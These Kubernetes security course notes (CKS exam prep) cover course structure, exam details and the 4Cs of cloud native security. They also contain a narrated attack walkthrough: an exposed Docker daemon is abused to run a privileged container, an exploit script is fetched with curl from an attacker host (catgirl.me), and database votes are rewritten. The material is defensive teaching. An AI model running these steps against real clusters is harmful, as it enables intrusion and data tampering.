---
title: "Certified Kubernetes Security Specialist (CKS) - KodeKloud Full Official Notes"
source: "https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/"
type: course_notes
domain: kubernetes/cks
---

# 🛡️ Certified Kubernetes Security Specialist (CKS) - Full KodeKloud Course Notes

This file contains the complete, official text explanations, configurations, diagrams, and CLI commands for all 105 modules of the KodeKloud CKS Course.

---



# 📂 Section: Introduction
## 📖 Course Introduction
**Source:** [https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Introduction/Course-Introduction/page](https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Introduction/Course-Introduction/page)

# Course Introduction

> This article introduces a course for preparing for the Certified Kubernetes Security Specialist exam, focusing on Kubernetes security concepts and hands-on labs.

Kubernetes has rapidly become a cornerstone of modern cloud computing, often hailed as the "Linux of the future." Today’s cutting-edge AI technologies, including ChatGPT and OpenAI, run on Kubernetes clusters. With the rapid growth in the AI industry, the demand for Kubernetes expertise is soaring. In fact, a recent survey by Indeed revealed that job searches for Kubernetes surged by over 173% compared to the previous year.

This article introduces the Certified Kubernetes Security Specialist (CKS) exam preparation course. My name is Mumshad Mannambeth and, together with Vijin Palazhi, we will be your guides throughout this course.

Kubernetes security is crucial since it manages containers distributed across multiple systems, making it an attractive target for attacks. By implementing robust security practices, you safeguard both your applications and operational integrity in dynamic cloud environments.

This course kicks off with engaging lectures that break down essential Kubernetes security concepts, supported by visual aids and animations:

<Frame>
  ![The image outlines Kubernetes security best practices, featuring elements like code, containers, authentication, and network policy, with a person in the bottom right corner.](https://kodekloud.com/kk-media/image/upload/v1752871624/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Course-Introduction/frame_60.jpg)
</Frame>

You will also gain hands-on experience through interactive labs, reinforcing your learning with real-life scenarios that simulate the actual CKS exam environment. Our AI assistants act as expert guides in the labs—tracking your progress, clarifying questions, and providing actionable feedback.

<Callout icon="lightbulb" color="#1CB2FE">
  Before you dive into this course, please note that the CKS exam requires you to be a [Certified Kubernetes Administrator (CKA)](https://learn.kodekloud.com/user/courses/cka-certification-course-certified-kubernetes-administrator). If you haven't completed that course or need to strengthen your foundational skills, consider starting with our beginner courses such as [Kubernetes for the Absolute Beginners - Hands-on Tutorial](https://learn.kodekloud.com/user/courses/kubernetes-for-the-absolute-beginners-hands-on-tutorial), [Docker Training Course for the Absolute Beginner](https://learn.kodekloud.com/user/courses/docker-training-course-for-the-absolute-beginner), or [DevOps Pre-Requisite Course](https://learn.kodekloud.com/user/courses/devops-pre-requisite-course).
</Callout>

## Course Structure and Key Topics

This course is meticulously structured to align with the CKS exam objectives, emphasizing both theoretical knowledge and practical security measures through real-world scenarios.

### 1. Exploring the Kubernetes Attack Surface

We begin by examining how various components of Kubernetes clusters can be exploited. This section introduces the four C’s of cloud-native security: cloud, clusters, containers, and code—providing a narrative that sets the stage for deeper exploration into security challenges.

### 2. Hardening Your Kubernetes Cluster

In this segment, you will discover essential strategies to secure your Kubernetes clusters, including:

* Implementing CIS Benchmarks
* Configuring authentication and authorization
* Managing Service Accounts
* Utilizing TLS certificates
* Securing the Kubernetes dashboard
* Enforcing network policies
* Conducting secure cluster upgrades

### 3. Securing the Underlying System

Securing the host system is as important as securing Kubernetes itself. This section covers methods such as:

* Minimizing the operating system footprint
* Implementing SSH hardening and access controls
* Restricting kernel modules and open ports
* Using firewalls and Seccomp for system call restrictions
* Leveraging tools like AppArmor for additional protection

### 4. Reducing Vulnerabilities in Microservices

This section outlines techniques to protect microservices, including:

* Managing Admission Controllers
* Implementing Pod Security Standards
* Utilizing policy engines such as the Open Policy Agent (OPA)
* Securing secrets and runtime sandboxes
* Applying mTLS for pod-to-pod encryption

### 5. Securing the Software Supply Chain

Securing your software supply chain is critical for maintaining a robust security posture. In this module, you will learn best practices such as:

* Minimizing base image sizes
* Scanning container images for vulnerabilities
* Validating and signing deployments

### 6. Runtime Security

The final section is dedicated to runtime security, focusing on behavioral analytics and threat detection. You will explore tools like Falco that help establish a defense-in-depth strategy through monitoring and activity logging.

## Hands-On Labs, Examples, and Exam Preparation

Every module of this course includes comprehensive hands-on labs and real-world examples to bolster your practical skills. The course concludes with a realistic mock exam designed to build your confidence and ensure you are exam-ready. Since the CKS exam is hands-on and permits referencing the official Kubernetes documentation, we also teach you how to navigate these resources efficiently to quickly locate critical information during the exam.

<Callout icon="lightbulb" color="#1CB2FE">
  KodeKloud is a CNCF Silver member, a Certified Kubernetes Training Partner, and a CNCF Endorsed Content Provider. This certification is a significant milestone in your journey to become a true "KubeAstronaut."
</Callout>

Let's get started—I'll see you in the first lecture.

<CardGroup>
  <Card title="Watch Video" icon="video" cta="Learn more" href="https://learn.kodekloud.com/user/courses/certified-kubernetes-security-specialist-cks/module/634a64ac-045c-479e-8d6a-6e2514af768d/lesson/363de760-ffac-46be-b1c2-5f0b6a5b6bee" />
</CardGroup>

---


# 📂 Section: Introduction
## 📖 Exam Information
**Source:** [https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Introduction/Exam-Information/page](https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Introduction/Exam-Information/page)

# Exam Information

> This article reviews essential details about the Certified Kubernetes Security Specialist program and provides information on exam requirements, fees, and preparation tips.

In this lesson, we review essential details about the Certified Kubernetes Security Specialist (CKS) program. The CKS certification validates your skills in implementing security best practices for cloud native computing, enhancing your professional credibility and marketability. For more detailed information about the exam, please visit the [CNCF certification page](https://www.cncf.io/certification/cks/).

<Callout icon="lightbulb" color="#1CB2FE">
  The current exam fee is \$300 (as of this recording). Follow our channels on Slack or social media to receive discount coupons during sales and promotions.
</Callout>

After purchasing the exam, you are granted one year to complete it, with up to two attempts allowed to achieve a passing score.

<Frame>
  ![The image describes the Certified Kubernetes Security Specialist (CKS) program by CNCF and The Linux Foundation, highlighting its importance and offering registration and training options.](https://kodekloud.com/kk-media/image/upload/v1752871626/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Exam-Information/frame_40.jpg)
</Frame>

Before attempting the CKS exam, you must successfully pass the [Certified Kubernetes Administrator (CKA) exam](https://learn.kodekloud.com/user/courses/cka-certification-course-certified-kubernetes-administrator) and hold an active (non-expired) CKA certification on the exam day. Like its counterpart, the CKS exam is conducted online and is entirely performance-based, assessing your proficiency with Kubernetes and its security features on Linux. Extensive hands-on practice with both Kubernetes and its security functions is essential for success.

<Frame>
  ![The image shows the text "Requirement" and a logo for "Certified Kubernetes Administrator" featuring a ship's wheel design.](https://kodekloud.com/kk-media/image/upload/v1752871627/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-Exam-Information/frame_60.jpg)
</Frame>

During the exam, you will have unlimited access to Kubernetes' official documentation pages. This course includes demonstrations on how to efficiently navigate and use the documentation site to quickly locate crucial information.

<Callout icon="lightbulb" color="#1CB2FE">
  Dedicate time to practical, hands-on exercises with Kubernetes and security functionalities. Thorough preparation will increase your exam confidence and help you pass with flying colors.
</Callout>

Best of luck as you prepare for and take the Kubernetes certification exam. Let's begin our journey to mastering Kubernetes security together.

***

<CardGroup>
  <Card title="Watch Video" icon="video" cta="Learn more" href="https://learn.kodekloud.com/user/courses/certified-kubernetes-security-specialist-cks/module/634a64ac-045c-479e-8d6a-6e2514af768d/lesson/51c4795a-4ddc-4f74-b03d-b08dc182d44a" />
</CardGroup>

---


# 📂 Section: Understanding the Kubernetes Attack Surface
## 📖 A Quick Reminder
**Source:** [https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Understanding-the-Kubernetes-Attack-Surface/A-Quick-Reminder/page](https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Understanding-the-Kubernetes-Attack-Surface/A-Quick-Reminder/page)

# A Quick Reminder

> This article emphasizes the importance of completing guided labs and videos before setting up a local environment in the course.

This article serves as an important reminder to focus on the labs and videos provided throughout this course. Although you might be excited to set up your own local environment, we strongly recommend that you complete the guided labs first. These labs and videos have been carefully structured to deliver a seamless, distraction-free learning experience, ensuring you gain the necessary skills efficiently.

To check the Docker images available on your system, run the following command:

```bash theme={null}
$ docker images
REPOSITORY                           TAG      SIZE
redis                                latest   105MB
ubuntu                               latest   72.7MB
mysql                                latest   556MB
nginx                                latest   22.6MB
alpine                               latest   5.61MB
nginx                                alpine   133MB
postgres                             latest   314MB
kodekloud/simple-webapp-mysql        latest   96.6MB
kodekloud/simple-webapp              latest   84.8MB
```

When you're ready to explore container execution, try running a Redis container with this command:

```bash theme={null}
$ docker run redis
```

<Callout icon="lightbulb" color="#1CB2FE">
  Additional resources for setting up your local environment will be shared at the right time during the course. For now, please concentrate on the lab exercises to master the essential skills needed for success.
</Callout>

Thank you for choosing our course and KodeKloud. Enjoy your learning journey!

<CardGroup>
  <Card title="Watch Video" icon="video" cta="Learn more" href="https://learn.kodekloud.com/user/courses/certified-kubernetes-security-specialist-cks/module/9c6c64a8-08e3-41f3-b9b4-30849336e6f9/lesson/3c6dad24-a7ab-406e-8dca-ab51c3de47cc" />
</CardGroup>

---


# 📂 Section: Understanding the Kubernetes Attack Surface
## 📖 The 4Cs of Cloud Native security
**Source:** [https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Understanding-the-Kubernetes-Attack-Surface/The-4Cs-of-Cloud-Native-security/page](https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Understanding-the-Kubernetes-Attack-Surface/The-4Cs-of-Cloud-Native-security/page)

# The 4Cs of Cloud Native security

> This article explores the Four Cs of Cloud Native Security, detailing essential components for protecting cloud native environments.

In this article, we explore the Four C's of Cloud Native Security and break down the critical components that contribute to protecting cloud native environments. Previously, we reviewed a demo where an attacker exploited vulnerabilities in a Kubernetes-hosted voting application. Multiple weaknesses were identified, and now we will examine each aspect in detail.

## 1. Cloud Security

The first “C” is cloud security, which focuses on protecting the overall infrastructure—be it a public cloud, private cloud, on-premises data center, or co-located environment. In our demo, the infrastructure hosting the Kubernetes cluster was insufficiently secured, permitting unrestricted access to cluster ports. Without proper network firewalls, remote access from the attacker’s system was easily achieved.

<Callout icon="lightbulb" color="#1CB2FE">
  Ensure that your cloud infrastructure includes robust network firewalls and proper access controls. This is not only essential for preventing unauthorized access but also for mitigating broader risks that can stem from exposed ports.
</Callout>

## 2. Cluster Security

The second “C” focuses on securing the Kubernetes cluster itself. In the demo, the attacker compromised the system by exploiting a publicly accessible Docker daemon and an unsecured Kubernetes dashboard that lacked proper authentication and authorization measures.

To secure your cluster:

* Follow best practices to protect the Docker daemon.
* Secure the Kubernetes API by enforcing strong access controls.
* Restrict dashboard access with proper authentication.
* Implement network policies and ingress security for additional safeguard measures.

For more detailed guidance on these topics, refer to our earlier section on cluster setup and hardening.

## 3. Container Security

The third “C” addresses container security. In the demonstration, the attacker was able to deploy containers without restrictions, including running containers in privileged mode. The absence of constraints on image sources or tags allowed the deployment of potentially harmful containers and unapproved applications.

To mitigate these risks:

* Enforce policies that allow only images from secure, trusted repositories.
* Disallow privileged mode for containers.
* Use container sandboxing to provide an additional layer of security.

These strategies also support efforts to minimize microservice vulnerabilities and enhance supply chain security.

## 4. Code Security

The final “C” focuses on code security. Although not the main focus of this lesson, securing application code remains critical. Common pitfalls include hard coding credentials, passing sensitive information via environment variables, or transmitting data without TLS encryption.

Key recommendations include:

* Implement Secrets Management and vault solutions for critical information.
* Enable mTLS encryption to ensure secure communication between pods.

<Frame>
  ![The image outlines code security best practices across layers: code, container, cluster, and cloud, highlighting elements like authentication, authorization, and network policy.](https://kodekloud.com/kk-media/image/upload/v1752871755/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-The-4Cs-of-Cloud-Native-security/frame_170.jpg)
</Frame>

<Callout icon="triangle-alert" color="#FF6B6B">
  Never overlook the importance of code security. Integrating strong security practices at the code level ensures that vulnerabilities are minimized, complementing other security layers such as container and cluster security.
</Callout>

## Summary

Adopting a comprehensive approach to cloud native security means addressing all four critical areas: cloud infrastructure, cluster configurations, container practices, and code integrity. By implementing robust security measures in each of these areas, you can significantly reduce the risk of exploits and ensure a more secure environment for your applications.

That concludes this lesson. See you in the next section!

<CardGroup>
  <Card title="Watch Video" icon="video" cta="Learn more" href="https://learn.kodekloud.com/user/courses/certified-kubernetes-security-specialist-cks/module/9c6c64a8-08e3-41f3-b9b4-30849336e6f9/lesson/bde8f9ba-c41f-4ec9-a7d4-7bd831f1e049" />
</CardGroup>

---


# 📂 Section: Understanding the Kubernetes Attack Surface
## 📖 The Attack
**Source:** [https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Understanding-the-Kubernetes-Attack-Surface/The-Attack/page](https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Understanding-the-Kubernetes-Attack-Surface/The-Attack/page)

# The Attack

> This article explores Kubernetes attack surfaces through a demonstration, analyzing vulnerabilities and highlighting security measures to prevent breaches.

In this lesson, we explore the high-level attack surface of Kubernetes through a live demonstration of an attack. We break down the events, analyze exploited vulnerabilities, and highlight the security measures that could have prevented this breach.

Imagine an election between cats and dogs. Voters cast their ballots via a web portal hosted at [www.vote.com](http://www.vote.com), and the results are published on [www.result.com](http://www.result.com). On the results page, despite thousands of votes, the dogs are leading by a significant margin.

<Frame>
  ![The image shows a poll result: 29% for cats and 71% for dogs, with a total of 2501 votes.](https://kodekloud.com/kk-media/image/upload/v1752871756/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-The-Attack/frame_50.jpg)
</Frame>

## Reconnaissance and Infrastructure Discovery

Meet "cat girl," a determined individual who believes it’s time for cats to win. With only the domain names vote.com and result.com, she starts her investigation into the underlying architecture. These applications might be built using technologies such as WordPress, PHP, Python, Ruby, or Java and could be hosted across various platforms including cloud services, PaaS, on-premises systems, physical hosts, virtual machines, or containers. The possibilities are endless.

Her investigation begins by identifying the IP addresses of these applications. Using a terminal, she pings both domains and discovers that they resolve to the same IP address, implying a shared hosting infrastructure.

```bash theme={null}
~ ➜ ping www.vote.com
PING www.vote.com (104.21.63.124): 56 data bytes
64 bytes from 104.21.63.124: icmp_seq=0 ttl=52 time=80.821 ms
64 bytes from 104.21.63.124: icmp_seq=1 ttl=52 time=80.927 ms
64 bytes from 104.21.63.124: icmp_seq=2 ttl=52 time=80.695 ms
64 bytes from 104.21.63.124: icmp_seq=3 ttl=52 time=80.819 ms
^C
--- www.vote.com ping statistics ---
4 packets transmitted, 4 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 80.695/80.816/80.927/0.082 ms
~ took 3s
```

Next, she performs a comprehensive port scan on the server to identify potential entry points. During the scan, she uncovers that port 2375—the default port for Docker—is open. This indicates that the applications are most likely running inside containers.

```bash theme={null}
zsh port-scan.sh 104.21.63.124
Scanning port  21 for   ftp        ...      Fail 🔴
Scanning port  22 for   ssh        ...      Fail 🔴
Scanning port  23 for   telnet     ...      Fail 🔴
Scanning port  25 for   smtp       ...      Fail 🔴
Scanning port  53 for   dns        ...      Fail 🔴
Scanning port  80 for   http       ...      Fail 🔴
Scanning port 110 for   pop3       ...      Fail 🔴
Scanning port 111 for   rpcbind    ...      Fail 🔴
Scanning port 135 for   msrpc      ...      Fail 🔴
Scanning port 139 for   netbios-ssn...      Fail 🔴
Scanning port 143 for   imap       ...      Fail 🔴
Scanning port 443 for   https      ...      Fail 🔴
Scanning port 445 for   ms-ds      ...      Fail 🔴
Scanning port 993 for   imaps      ...      Fail 🔴
Scanning port 995 for   pop3s      ...      Fail 🔴
Scanning port 1723 for  pptp       ...      Fail 🔴
Scanning port 2375 for  docker     ...      Success 🟢
Scanning port 3306 for  mysql      ...      Fail 🔴
Scanning port 3389 for  ms-wbt     ...      Fail 🔴
Scanning port 5900 for  vnc        ...      Fail 🔴
~ took 4s
```

<Callout icon="lightbulb" color="#1CB2FE">
  Ensure that Docker ports are not exposed to the public internet without proper authentication as it can lead to unauthorized access.
</Callout>

## Exploiting the Open Docker Port

With the Docker port accessible and left unsecured (due to default settings with no authentication), she executes a command to list the running containers on the host powering the voting application.

```bash theme={null}
docker -H www.vote.com ps
```

The output reveals a long list of running containers. To gather more information about the Docker engine, she checks its version:

```bash theme={null}
docker -H www.vote.com version
```

Output:

```bash theme={null}
Client: Docker Engine - Community
 Version:           19.03.8
 API version:       1.40
 Go version:        go1.12.17
 Git commit:        afacb8b
 Built:             Wed Mar 11 01:21:11 2020
 OS/Arch:           darwin/amd64
 Experimental:      false

Server:
 Engine:
  Version:          19.03.6
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.12.17
  Git commit:       369ce74a3c
  Built:            Thu Dec 10 13:23:49 2020
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          
  GitCommit:      
 runc:
```

Realizing the potential to leverage the open Docker port, she launches a privileged container using the Ubuntu image. This container provides a pathway to escape into the host system.

```bash theme={null}
docker -H www.vote.com run --privileged -it ubuntu bash
```

Once inside the container, she confirms access by checking for the root shell prompt:

```bash theme={null}
root@174e320b98f9:/#
```

## Attempting Container Escape with Dirty COW

Her next move is to download an exploit script targeting the [Dirty COW vulnerability](https://en.wikipedia.org/wiki/Dirty_COW) to escape the container. Initially, she attempts to use curl:

```bash theme={null}
root@174e320b98f9:/# curl http://catgirl.me/dirty-cow.sh > dirty-cow.sh
bash: curl: command not found
```

She also tries wget:

```bash theme={null}
root@174e320b98f9:/# wget
bash: wget: command not found
```

Since the container lacks these utilities and there are no restrictions on installing binaries, she proceeds to install curl. Once installed, she downloads the Dirty COW exploit script and executes it to break out of the container into the host environment.

During the installation process, the output includes:

```bash theme={null}
Preparing to unpack .../25-libldap-2.4-2.4.49+dfsg-2ubuntu1.7_amd64.deb ...
Unpacking libldap-2.4-2 (2.4.49+dfsg-2ubuntu1.7) ...
Preparing to unpack .../26-libnghttp2-14_1.40.0-1build1_amd64.deb ...
Unpacking libnghttp2-14:amd64 (1.40.0-1build1) ...
Selecting previously unselected package librtmp1:amd64.
Unpacking librtmp1:amd64 (2.4+20151223.gitfa8646d.1-2build1_amd64.deb) ...
Selecting previously unselected package libssh-4:amd64.
Unpacking libssh-4:amd64 (0.9.3-2ubuntu2.1_amd64.deb) ...
Selecting previously unselected package libcurl4:amd64.
Unpacking libcurl4:amd64 (7.68.0-1ubuntu2.5_amd64.deb) ...
Selecting previously unselected package curl.
Unpacking curl (7.68.0-1ubuntu2.5_amd64.deb) ...
Preparing to unpack .../31-libsasl2-modules_2.1.27+dfsg-2_amd64.deb ...
Unpacking libsasl2-modules:amd64 (2.1.27+dfsg-2_amd64.deb) ...
Setting up libkeyutils1:amd64 (1.5.9-9ubuntu1) ...
Setting up libbison1:amd64 (2.4.1-2ubuntu1) ...
debconf: unable to initialize frontend: Dialog
debconf: (No usable dialog-type program is installed, so the dialog based frontend cannot be used. at /usr/share/perl5/Debconf/FrontEnd/Dialog.pm line 76.)
debconf: falling back to frontend: Readline
debconf: Unable to initialize frontend: Readline
debconf: (Can't locate Term/ReadLine.pm in @INC ...) 
debconf: falling back to frontend: Teletype
```

With the exploit executed, she successfully escapes from the container and gains a shell on the underlying host.

## Host Reconnaissance and Kubernetes Discovery

Now on the host, she explores the environment further by inspecting disk usage and volume mounts:

```bash theme={null}
df -h
```

Output:

```bash theme={null}
Filesystem      Size  Used Avail Use% Mounted on
udev            2.0G     0  2.0G   0% /dev
tmpfs           395M  2.0M  393M   1% /run
/dev/sda1      9.7G  7.7G  2.0G  80% /
tmpfs           2.0G     0  2.0G   0% /dev/shm
tmpfs           5.0M  0.5M  0.0M   0% /run/lock
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
vagrant         3.7T 631G  3.1T  17% /vagrant
tmpfs           395M     0  395M   0% /run/user/1000
```

Executing the `hostname` command, she discovers that the machine is named "worker," indicating that she is operating on a worker node within a Kubernetes cluster. Investigation of the running containers reveals several with names starting with "k8s," including one instance of the Kubernetes dashboard. Notably, the dashboard is exposed on port 30080 of the node.

<Frame>
  ![A dark interface with a superhero emoji, a tilde, and two website links: "www.vote.com" and "www.result.com," each with a colored square beside them.](https://kodekloud.com/kk-media/image/upload/v1752871757/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-The-Attack/frame_110.jpg)
</Frame>

To confirm the open access, she inspects the node’s iptables rules:

```bash theme={null}
sudo iptables -L -t nat | grep kubernetes
```

The iptables output verifies that the Kubernetes dashboard is accessible publicly on port 30080. When accessed, the dashboard displays detailed cluster information including node status, deployments, and namespaces.

<Frame>
  ![The image shows a Kubernetes dashboard displaying node information, including names, labels, readiness, CPU, and memory usage for "worker" and "master" nodes.](https://kodekloud.com/kk-media/image/upload/v1752871759/notes-assets/images/Certified-Kubernetes-Security-Specialist-CKS-The-Attack/frame_350.jpg)
</Frame>

The dashboard confirms that this is a single-master, single-worker Kubernetes cluster. Alongside the voting application, the deployment includes a database (DB) service, a ready service, and a worker. Given her objective, she focuses on the DB service.

## Database Compromise

By inspecting the environment variables of the DB pod, she discovers the database credentials. After identifying the corresponding database container, she uses the [PSQL utility](https://www.postgresql.org/docs/current/app-psql.html) to connect to the database.

Inside the database, she locates the table storing votes and verifies that all votes currently favor dogs. Acting quickly, she writes and executes a script that updates the vote counts, effectively switching dog votes to cat votes.

```sql theme={null}
-- Sample output indicating successful vote update
734783fsde3de125 | a
734783fsde3de126 | a
734783fsde3de129 | a
734783fsde3de131 | a
734783fsde3de132 | a
734783fsde3de133 | a
734783fsde3de21  | a
734783fsde3de24  | a
734783fsde3de26  | a
734783fsde3de27  | a
734783fsde3de28  | a
734783fsde3de29  | a
734783fsde3de30  | a
734783fsde3de31  | a
734783fsde3de32  | a
734783fsde3de33  | a
734783fsde3de34  | a
734783fsde3de36  | a
734783fsde3de38  | a
734783fsde3de39  | a
734783fsde3de40  | a
734783fsde3de43  | a
734783fsde3de44  | a
734783fsde3de47  | a
postgres=#
```

With the database manipulation complete, the election results are set to be overturned.

<Callout icon="triangle-alert" color="#FF6B6B">
  Misconfigured and unsecured containers or services can lead to severe breaches. Always ensure that appropriate security measures are in place to restrict unauthorized access.
</Callout>

## Conclusion

This high-level overview illustrates how the absence of proper security practices can lead to a catastrophic breach in containerized environments. In the remainder of this lesson, we will dive deeper into each attack vector, understand how the vulnerabilities were exploited, and outline best practices to secure each component of such systems.

That's it for now—until the next part of this lesson.

<CardGroup>
  <Card title="Watch Video" icon="video" cta="Learn more" href="https://learn.kodekloud.com/user/courses/certified-kubernetes-security-specialist-cks/module/9c6c64a8-08e3-41f3-b9b4-30849336e6f9/lesson/44b22d6a-eb7a-4448-b6b4-c888cb8307df" />
</CardGroup>

---


